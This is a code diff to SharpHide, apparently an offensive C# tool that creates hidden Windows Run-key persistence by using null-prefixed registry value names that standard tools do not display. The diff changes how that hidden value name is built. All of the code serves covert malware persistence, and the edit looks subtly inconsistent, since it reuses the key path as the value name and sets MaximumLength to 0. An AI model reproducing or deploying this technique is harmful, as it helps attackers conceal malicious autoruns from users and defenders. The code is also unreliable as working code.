@@ -140,6 +140,7 @@ namespace SharpHide
 
             UIntPtr regKeyHandle = UIntPtr.Zero;
             string runKeyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+            string runKeyPathTrick = "\0\0SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
 
             bool IsSystem;
             using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
@@ -161,7 +162,11 @@ namespace SharpHide
                 Status = RegOpenKeyEx(HKEY_CURRENT_USER, runKeyPath, 0, KEY_SET_VALUE, out regKeyHandle);
             }
 
-            UNICODE_STRING ValueName = new UNICODE_STRING("\00CatchMe");
+            UNICODE_STRING ValueName = new UNICODE_STRING(runKeyPathTrick)
+            {
+                Length = 2 * 11,
+                MaximumLength = 0
+            };
             IntPtr ValueNamePtr = StructureToPtr(ValueName);
 
             if (arguments["action"] == "delete") {
